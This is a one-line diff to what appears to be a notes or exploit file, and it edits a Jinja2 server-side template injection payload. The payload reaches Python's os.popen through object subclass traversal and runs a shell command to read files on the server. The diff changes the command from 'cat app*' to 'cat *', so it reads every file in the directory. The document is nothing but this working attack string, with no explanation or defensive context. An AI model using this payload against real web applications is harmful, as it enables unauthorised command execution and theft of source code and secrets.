@@ -1,1 +1,1 @@
-# {{ ''['__class__']['__mro__'][1]['__subclasses__']()[182]()["_module"]["__builtins__"]['__import__']('os')['popen']("cat app*")['read']() }}
+# {{ ''['__class__']['__mro__'][1]['__subclasses__']()[182]()["_module"]["__builtins__"]['__import__']('os')['popen']("cat *")['read']() }}
